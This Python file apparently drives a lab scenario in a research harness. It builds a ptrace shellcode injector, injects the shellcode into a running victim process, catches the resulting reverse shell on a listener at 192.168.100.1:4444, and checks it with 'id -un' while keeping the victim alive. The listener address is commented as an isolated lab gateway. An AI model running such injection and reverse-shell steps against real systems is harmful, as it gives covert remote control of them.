"""Explicit runner for the ptrace foreign-allocation shellcode injection scenario."""

from __future__ import annotations

import socket
from collections.abc import Callable
from pathlib import Path

from orchestrator.core import console
from orchestrator.core.provenance import file_sha256
from orchestrator.core.ssh_client import SSHClient
from scenarios.command_log import record_operation, run_logged_command
from scenarios.ptrace_fa import shellcode

SCENARIO_ID = "ptrace_fa"
ROOT = Path(__file__).resolve().parent
FILES_DIR = ROOT / "files"
BUILD_SCRIPT = FILES_DIR / "build.sh"

_BUILDER_SOURCE_ROOT = "/tmp/ptrace-fa-source"
_BUILDER_BUILD_ROOT = "/tmp/ptrace-fa-build"
_BUILDER_SCRIPT = "/tmp/ptrace-fa-build.sh"

VICTIM_ROOT = "/tmp"

# Where the host listens for the reverse shell; it is the isolated lab
# network's host-side gateway (see infra/provider.py). The shellcode is
# retargeted to this host/port at build time (see shellcode.py).
LISTENER_HOST = "192.168.100.1"
LISTENER_PORT = 4444
SHELL_TIMEOUT = 15

SOURCE_FILES = (
    "src/shellcode_inject_fa.c",
    "src/victim.c",
    "common/ptrace_utils.c",
    "common/ptrace_utils.h",
    "common/utils.c",
    "common/utils.h",
)
ARTIFACT_NAMES = ("shellcode_inject_fa", "victim")
VICTIM_ARTIFACTS = tuple(f"/tmp/ptrace_fa-{name}" for name in ARTIFACT_NAMES)

# Backgrounded, nohup'd, and disowned so the victim (and the shell it later
# forks) survive the terminal closing while the run continues toward
# acquisition.
START_VICTIM_COMMAND = f"nohup ./victim >{VICTIM_ROOT}/victim.log 2>&1 & disown; echo $!"


def build(ssh: SSHClient, staging: Path) -> tuple[tuple[Path, Path], str]:
    """Build the ptrace binaries on the builder VM."""
    artifacts = tuple(staging / name for name in ARTIFACT_NAMES)
    ssh.run_checked(
        f"rm -rf {_BUILDER_SOURCE_ROOT} && "
        f"mkdir -p {_BUILDER_SOURCE_ROOT}/src {_BUILDER_SOURCE_ROOT}/common"
    )
    for name in SOURCE_FILES:
        ssh.put(FILES_DIR / name, f"{_BUILDER_SOURCE_ROOT}/{name}")
    ssh.put(BUILD_SCRIPT, _BUILDER_SCRIPT)
    stdout = ssh.run_checked(
        f"bash {_BUILDER_SCRIPT} {_BUILDER_SOURCE_ROOT} {_BUILDER_BUILD_ROOT} "
        f"{shellcode.target_hex(LISTENER_HOST, LISTENER_PORT)}",
        timeout=1800,
    )
    for name, artifact in zip(ARTIFACT_NAMES, artifacts, strict=True):
        ssh.get(f"{_BUILDER_BUILD_ROOT}/{name}", artifact)
    return artifacts, stdout


def build_source() -> dict:
    """Return hashes of the exact source files uploaded to the builder."""
    return {"files": {name: file_sha256(FILES_DIR / name) for name in SOURCE_FILES}}


def build_recipe() -> dict:
    """Return the exact scenario-owned build recipe recorded by the host."""
    return {
        "sha256": file_sha256(BUILD_SCRIPT),
        "target_hex": shellcode.target_hex(LISTENER_HOST, LISTENER_PORT),
    }


def run_ptrace_fa(
    ssh: SSHClient,
    transcript_path: Path,
    *,
    command_log_path: Path,
    artifact_paths: tuple[Path, Path],
    build_record: dict,
) -> tuple[dict, Callable[[], None]]:
    """Execute the prepared PoC, inject shellcode, and validate the shell."""
    transcript_path.touch()
    listener = _open_listener()
    console.scope("HOST", "stage ptrace_fa artifacts")
    _upload_artifacts(ssh, command_log_path, artifact_paths)
    terminal = ssh.open_terminal()
    reverse_shell = None

    def close_reverse_shell() -> None:
        nonlocal reverse_shell
        if reverse_shell is None:
            return
        reverse_shell.close()
        reverse_shell = None

    try:
        with terminal:
            console.scope("GUEST", "verify prepared artifacts")
            guest_identity = run_logged_command(
                terminal,
                command_log_path,
                ". /etc/os-release; "
                "printf '%s-%s %s\\n' \"$ID\" \"$VERSION_ID\" \"$(uname -m)\"",
                timeout=180,
            ).combined_output
            try:
                expected = (
                    f"{build_record['target']['distro_id']} "
                    f"{build_record['target']['arch']}"
                )
                if guest_identity != expected:
                    raise RuntimeError(
                        f"ptrace_fa artifacts target {expected}, guest is {guest_identity}"
                    )
            except Exception as exc:
                record_operation(
                    command_log_path, "verify_guest_identity", error=str(exc)
                )
                raise
            record_operation(command_log_path, "verify_guest_identity")

            console.scope("GUEST", "prepare binaries")
            for source, name in zip(VICTIM_ARTIFACTS, ARTIFACT_NAMES, strict=True):
                run_logged_command(
                    terminal,
                    command_log_path,
                    f"install -m 0755 {source} {VICTIM_ROOT}/{name}",
                )
            run_logged_command(terminal, command_log_path, f"cd {VICTIM_ROOT}")

            console.scope("GUEST", "start victim")
            identity = run_logged_command(
                terminal, command_log_path, "id -un"
            ).combined_output.strip()
            # Interactive job control prints a "[1] <pid>" notice before the
            # echo output, so only the last line is the captured PID.
            victim_output = run_logged_command(
                terminal, command_log_path, START_VICTIM_COMMAND
            ).combined_output.strip()
            victim_pid = victim_output.splitlines()[-1].strip()
            if not victim_pid.isdigit():
                raise RuntimeError(f"Victim PID was not captured: {victim_output!r}")

            console.scope("GUEST", "inject shellcode")
            run_logged_command(
                terminal,
                command_log_path,
                f"./shellcode_inject_fa {victim_pid}",
                timeout=30,
            )

            console.scope("HOST", "validate reverse shell")
            try:
                shell_identity, reverse_shell = _accept_reverse_shell(listener, identity)
            except Exception as exc:
                record_operation(command_log_path, "validate_reverse_shell", error=str(exc))
                raise
            record_operation(command_log_path, "validate_reverse_shell")

            console.scope("GUEST", "validate victim survived")
            survived = run_logged_command(
                terminal, command_log_path, f"kill -0 {victim_pid} && echo alive"
            ).combined_output.strip()
            if survived != "alive":
                raise RuntimeError("Victim process did not survive injection")
    except BaseException:
        close_reverse_shell()
        raise
    finally:
        listener.close()
        try:
            transcript_path.write_text(terminal.transcript, encoding="utf-8")
        except BaseException:
            close_reverse_shell()
            raise

    try:
        facts = {
            "victim_pid": int(victim_pid),
            "victim_process_survived_injection": True,
            "reverse_shell_identity": shell_identity,
            "reverse_shell_connection_open_at_scenario_completion": True,
            "listener_host": LISTENER_HOST,
            "listener_port": LISTENER_PORT,
        }
        assert reverse_shell is not None
        return facts, close_reverse_shell
    except BaseException:
        close_reverse_shell()
        raise


def _upload_artifacts(
    ssh: SSHClient,
    command_log_path: Path,
    artifact_paths: tuple[Path, Path],
) -> None:
    console.step("uploading ptrace_fa artifacts...")
    try:
        for artifact, remote_path in zip(
            artifact_paths, VICTIM_ARTIFACTS, strict=True
        ):
            ssh.put(artifact, remote_path)
    except Exception as exc:
        record_operation(command_log_path, "upload_artifact", error=str(exc))
        raise
    record_operation(command_log_path, "upload_artifact")


def _open_listener() -> socket.socket:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        sock.bind((LISTENER_HOST, LISTENER_PORT))
        sock.listen(1)
    except OSError as exc:
        sock.close()
        raise RuntimeError(
            f"Could not listen on {LISTENER_HOST}:{LISTENER_PORT} for the "
            f"shellcode's reverse shell: {exc}"
        ) from exc
    return sock


def _accept_reverse_shell(
    listener: socket.socket,
    expected_identity: str,
) -> tuple[str, socket.socket]:
    console.step(f"waiting for reverse shell on {LISTENER_HOST}:{LISTENER_PORT}...")
    conn = None
    try:
        listener.settimeout(SHELL_TIMEOUT)
        conn, _addr = listener.accept()
        conn.settimeout(SHELL_TIMEOUT)
        conn.sendall(b"id -un\n")
        identity = conn.recv(4096).decode(errors="replace").strip()
        if identity != expected_identity:
            raise RuntimeError(
                f"Reverse shell returned unexpected identity: {identity!r}"
            )
        console.ok(f"Reverse shell connected; identity confirmed: {identity}")
        return identity, conn
    except OSError as exc:
        if conn is not None:
            conn.close()
        raise RuntimeError(f"ptrace_fa reverse shell did not connect: {exc}") from exc
    except BaseException:
        if conn is not None:
            conn.close()
        raise
